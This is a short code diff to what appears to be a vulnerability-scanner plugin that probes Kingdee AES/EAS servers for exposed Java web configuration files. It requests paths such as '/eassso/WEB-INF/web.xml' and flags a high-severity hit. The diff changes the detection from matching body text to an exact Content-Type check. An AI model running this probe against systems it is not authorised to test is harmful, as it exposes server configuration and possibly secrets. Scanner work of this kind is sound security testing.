@@ -23,12 +23,12 @@ class kingdee_conf_disclosure_BaseVerify:
         vulnurl = self.url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            if r"<?xml version" in req.text:
+            if req.headers["Content-Type"] == "application/xml":
                 cprint("[+]存在金蝶AES系统Java web配置文件泄露漏洞...(高危)\tpayload: "+vulnurl, "green")
 
             vulnurl = self.url + "/eassso/WEB-INF/web.xml"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            if r"<?xml version" in req.text:
+            if req.headers["Content-Type"] == "application/xml":
                 cprint("[+]存在金蝶AES系统Java web配置文件泄露漏洞...(高危)\tpayload: "+vulnurl, "green")
 
         except:
